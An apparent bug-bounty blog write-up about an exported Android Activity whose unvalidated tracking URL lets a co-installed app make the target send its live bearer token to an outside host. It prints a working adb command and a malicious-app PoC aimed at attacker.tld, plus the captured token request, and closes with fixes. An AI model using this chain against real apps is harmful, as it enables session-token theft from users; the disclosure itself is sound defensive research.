---
title: "Client-Side SSRF to Credential Theft via Exported Android Activity"
date: 2026-07-13
author: xchopath
category: Android Security
tags: [android, ssrf, intent-injection, bug-bounty]
read_time: 13
description: >-
  How reading one exported Activity by hand, following an unvalidated URL field,
  and misreading the impact twice led to a one-tap session token leak any
  co-installed app could trigger.
---

I wasn't hunting for this bug. I was doing the boring first pass I do on every
Android target: enumerate what the app exposes to other apps, because exported
components are the only attack surface a second app on the device can reach
without a single permission. That enumeration is where this started, and the bug
only appeared after I misjudged its impact twice.

## What caught my eye in the manifest

I list every component that is exported, either explicitly with
`android:exported="true"` or implicitly by declaring an intent filter. The reason
I start here and nowhere else: if a component isn't reachable from another app,
its input is not attacker-controlled, and I don't care about it yet.

Most of what came back was ordinary deep-linking. `VIEW` intents pointed at the
usual product screens, the kind every app ships. One entry did not fit the
pattern:

```xml
<activity
    android:name="com.example.app.OrderUpdateActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="SHOW_ORDER_UPDATE" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

The custom action string `SHOW_ORDER_UPDATE` is what made me stop. Standard deep
links use `android.intent.action.VIEW`. A bespoke action name almost always means
the component was built to be triggered internally, by the app's own push
handler or a framework bridge, not by the outside world. My honest first reaction
was to deprioritize it. "Show order update" sounds like a read-only UI screen
that renders a notification, and a screen that just draws some order status is
not where you expect a critical bug. That assumption was wrong, and it is the
first thing I had to unlearn.

The reason it was wrong: the name describes intent, not enforcement. The
component was clearly *meant* to be internal, but it was exported with no
permission gate, so "only our own code calls this" was a design assumption, not a
control. Any installed app can send it an intent regardless of what the developer
imagined.

> A custom action string on an exported component is a
> stronger lead than a normal `VIEW` deep link. It signals a surface the
> developer treated as private, which usually means it never got the input
> validation that public-facing screens receive. Don't let the reassuring name
> talk you out of reading it.

## Reading the code instead of grepping it

I decompiled with JADX. My first instinct on any obfuscated target is to grep for
`getStringExtra` or URL-shaped strings, but obfuscation renames everything and
that approach falls apart fast, so I traced the activity by hand instead.

`OrderUpdateActivity` did almost nothing to what it received:

```java
public class OrderUpdateActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        String action = getIntent().getAction();
        if ("SHOW_ORDER_UPDATE".equals(action)) {
            String rawJson = getIntent().getStringExtra("payload");
            OrderUpdatePayload payload = new Gson().fromJson(rawJson, OrderUpdatePayload.class);
            openOrderUpdate(payload);
        }
    }
}
```

This changed my read of the component immediately. It takes a raw string from the
intent, hands it straight to Gson, and deserializes it into a model with no
validation of any kind. The "read-only UI screen" I had dismissed was actually
parsing attacker-controlled JSON on the very first line of `onCreate`. So the
next question was simple: what is in that model, and does any field reach
somewhere dangerous?

Following the model is what made it exploitable. It carried a URL:

```java
@Keep
public class OrderUpdateData {
    private String trackingUrl;
    private Map<String, Object> params;
    public String getTrackingUrl() { return trackingUrl; }
}
```

A `trackingUrl` I fully control, deserialized from my intent, with a `@Keep`
annotation that conveniently preserved the field names through obfuscation. I
traced `getTrackingUrl()` forward to see where it was used, and it flowed,
unsanitized, into a Retrofit call:

```java
public interface TrackingService {
    @POST
    Call<TrackingResponse> fetchStatus(@Url String url, @Body RequestBody body);
}
```

## Where I misread the impact the second time

Seeing an attacker-controlled string reach `@Url`, my first label for this was
"SSRF, but so what." My reasoning at that moment: the worst case is I make the
app fetch a URL of my choosing, which sounded like a low-value client-side quirk.
Apps make network requests all the time. I nearly wrote it up as a minor issue
and moved on.

What corrected me was reading the OkHttp client sitting behind that Retrofit
instance. Its interceptor attached credentials to every outgoing request:

```java
public class SessionInterceptor implements Interceptor {
    @Override
    public Response intercept(Chain chain) throws IOException {
        Request original = chain.request();
        Request.Builder builder = original.newBuilder()
            .header("Authorization", "Bearer " + tokenProvider.getToken())
            .header("device-id", deviceIdProvider.get())
            .header("client-id", clientId);
        return chain.proceed(builder.build());
    }
}
```

That reframed the whole bug. The real problem was the destination: I could make
the app fire a request at *my* URL with its live bearer token stapled on. The
interceptor never inspects where the request is going before it attaches the
token. My controlled URL and this host-blind interceptor were about to meet on
the same request.

Before believing it, I checked the one detail the exploit depended on: how
Retrofit treats `@Url`. When `@Url` receives an absolute URL, Retrofit discards
the client's configured base URL and uses my string as the entire destination.
Combined with a bare `@POST` that declares no fixed path, the parameter *is* the
target. Give it `https://attacker.tld/collect`, and that is exactly where the
request goes. That confirmed the theory: I don't need to reach the server's
internal network the way server-side SSRF does. I only need the app to make a
request I choose, and the interceptor turns that request into a credential leak.

> A bare `@Url` parameter with no fixed path is worth
> tracing to its source every time, but the field alone is only half a finding.
> The severity is decided by the interceptor. An auth interceptor that attaches a
> token without validating the destination host is what upgrades a shrug-worthy
> client-side SSRF into token theft. Read the two together, not separately.

## Proving the chain

I confirmed the activity actually fires the request before building anything
elaborate. `adb` was the fastest way to send the intent by hand:

```bash
adb shell am start -n com.example.app/.OrderUpdateActivity \
  -a SHOW_ORDER_UPDATE \
  --es payload '{"data":{"trackingUrl":"https://attacker.tld/collect","params":{}}}'
```

My listener caught this seconds later:

```
POST /collect HTTP/1.1
Host: attacker.tld
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.sw3ag-token-body
device-id: 4c1a9e2f-fake-device-id
client-id: android-app-prod
Content-Type: application/json

{ ... }
```

There was the live session token, sitting in a request the victim's own app sent
to my server. That was the evidence that the chain held end to end.

> `adb` proves the theory, but it is not an attack. Nobody has a debugger attached to their phone.

The realistic delivery is a second, ordinary app that sends the same intent from code, because that is the threat model exported components actually live in:

```java
public class LauncherActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        String payload = "{\"data\":{\"trackingUrl\":\"https://attacker.tld/collect\",\"params\":{}}}";

        Intent intent = new Intent("SHOW_ORDER_UPDATE");
        intent.setClassName("com.example.app", "com.example.app.OrderUpdateActivity");
        intent.putExtra("payload", payload);
        startActivity(intent);

        finish();
    }
}
```

The malicious app needs no special permissions. A plain launcher entry is enough,
which is the part that makes this practical:

```xml
<activity
    android:name=".LauncherActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity>
```

Install it next to the target, open it once, and the token walks out the door.

## Root cause

The uncomfortable part is that no single developer did anything obviously wrong,
and that is exactly why I misjudged it twice before seeing it.

- Exporting the activity made sense in isolation. It exists to receive
  server-issued payloads from push notifications.
- The bare `@Url` made sense in isolation. The tracking service legitimately hits
  several endpoint shapes, and `@Url` is the flexible way to support that.
- The host-blind interceptor made sense in isolation. In testing, every request
  went to first-party infrastructure, so validating the host looked like dead
  code.

Each decision is defensible on its own, and no code review that reads one file
would catch the interaction. The vulnerability only exists in the seam between
the three, which is the reason a manifest grep or a single-file audit misses it
and a hand-trace finds it.

## Fixes

1. **Default to `exported="false"`.** If a component genuinely needs cross-app
   access, gate it behind a signature-level permission instead of leaving it open.
2. **Allowlist URLs that come from outside.** Any string that originates off-device
   must be checked against a hardcoded list of legitimate hosts before it can
   become a request destination.
3. **Make the interceptor host-aware.** Anything that attaches credentials should
   validate the destination against that same allowlist before it proceeds. An
   auth interceptor is the last place you want to trust the URL blindly.
